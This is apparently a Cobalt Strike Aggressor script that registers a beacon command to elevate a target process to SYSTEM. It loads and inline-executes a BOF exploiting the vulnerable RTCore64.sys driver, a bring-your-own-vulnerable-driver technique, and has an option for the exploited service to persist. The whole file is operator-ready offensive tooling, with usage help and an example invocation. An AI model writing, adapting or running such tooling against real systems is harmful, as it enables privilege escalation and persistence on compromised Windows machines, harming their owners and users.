# author @mooolight

beacon_command_register(
	"byovd-rtcore64-tokenconf-setintegritylevel", "Elevate the integrity of the target process to NT AUTHORITY\SYSTEM by exploiting the vulnerable RTCore64.sys.",
	"INFO:\nElevate the integrity of the target process to NT AUTHORITY\SYSTEM by exploiting the vulnerable RTCore64.sys.\n\n" .
	"ARGUMENTS:\n[<targetProc>]: Target process for the action parameter.\n[<pers>]: Set the status of the service' persistence.\n\n" .
	"USAGE:\nbyovd-rtcore64-tokenconf-setintegritylevel <targetProc> <pers>\n\n".
	"EXAMPLES:\nbyovd-rtcore64-tokenconf-setintegritylevel 7957 TRUE\n\n");

alias byovd-rtcore64-tokenconf-setintegritylevel {
    $bid = $1;
	$targetProc = $2;
    $pers = $3;
    
	if ($targetProc eq "") {
        berror($bid, "Please specify the target process to modify either the elevation or token privilege(s).\n");
        return;
    }
    if ($pers eq "") {
        berror($bid, "Please specify whether the exploited service will persist or not.\n");
        return;
    }
	
    # Read in the right BOF file
    $handle = openf(script_resource("byovd-rtcore64-tokenconf-setintegritylevel-bof.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $arg_data  = bof_pack($bid,"zz",$targetProc,$pers);

    blog($bid, "Elevate the integrity of the target process to NT AUTHORITY\SYSTEM by exploiting the vulnerable RTCore64.sys.");
    beacon_inline_execute($bid, $data, "go", $arg_data);
}
